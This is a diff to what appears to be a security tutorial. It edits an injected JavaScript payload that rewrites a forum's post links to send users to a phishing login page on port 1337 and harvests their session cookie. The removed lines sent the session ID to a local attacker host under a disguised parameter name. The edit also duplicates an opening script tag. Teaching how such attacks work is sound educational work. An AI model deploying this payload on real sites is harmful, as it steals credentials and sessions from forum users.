@@ -50,6 +50,7 @@ It's bad enough when you consider that a phishing attack could hand user credent
 
 ```html
 <script type = "text/javascript">
+<script type = "text/javascript">
 $(document).ready(function () {
   function getCookie(n) {
     // returns the value of a named cookie
@@ -69,14 +70,11 @@ $(document).ready(function () {
   }
 
   function setCookie() {
-    // Make a new cookie called 'h' (for 'harvested') which pulls the first,
-    // middle and last chars from the session ID
-    // This will be used to check if the session ID has been updated and needs
-    // to be stored
+    // Make a new cookie called 'h' (for 'harvested') which pulls the first, middle and last chars from the session ID
+    // This will be used to check if the session ID has been updated and needs to be stored
     // using 3 check chars is less suspicious than storing the entire session ID
     var sid = getCookie("connect.sid");
-    document.cookie = "h="+ sid.charAt(0) + sid.charAt(sid.length - 1) +
-    sid.charAt((sid.length -1)/2) + ";expires=session;path=/";
+    document.cookie = "h="+ sid.charAt(0) + sid.charAt(sid.length - 1) + sid.charAt((sid.length -1)/2) + ";expires=session;path=/";
   }
 
   function isNewSession() {
@@ -91,22 +89,16 @@ $(document).ready(function () {
   }
 
   var current_page_path = window.location.pathname;
-  // If the session ID is one we've seen before, don't replace the hyperlinks.
-  // That way the redirect to the 'login' page looks like a one-off error to
-  // the user, and we don't collect the same session ID more than
+  // If the session ID is one we've seen before, don't replace the hyperlinks. That way the redirect to the 'login' page looks like a one-off error to the user, and we don't collect the same session ID more than once
   if (!current_page_path.includes("/post") && isNewSession()) {
     // Only run the script on the forum home page, leave individual post pages alone
     $("td > a").each(function(i) {
       console.log(document.cookie);
       var original_path = $(this).attr("href");
+      var hostname = window.location.hostname;
       // Replace all links in the table of posts with links to the phishing site
-      // Pass along the ID of the post the user was trying to see (so we can
-      // direct them back to it after 'logging them back in') and the session
-      // ID so we can steal sessions if the mood takes us mwahaha
-      // the session_id is named error_id in the GET request so that if a user
-      // notices the token in the URL it's not so obvious what we're stealing
-      var new_href = "http://127.0.0.1:1337" + original_path + "&error_id=" +
-                     getCookie("connect.sid");
+      // Pass along the ID of the post the user was trying to see (so we can direct them back to it after 'logging them back in')
+      var new_href = "http://" + hostname + ":1337" + original_path;
       $(this).prop("href", new_href);
     });
     setCookie();
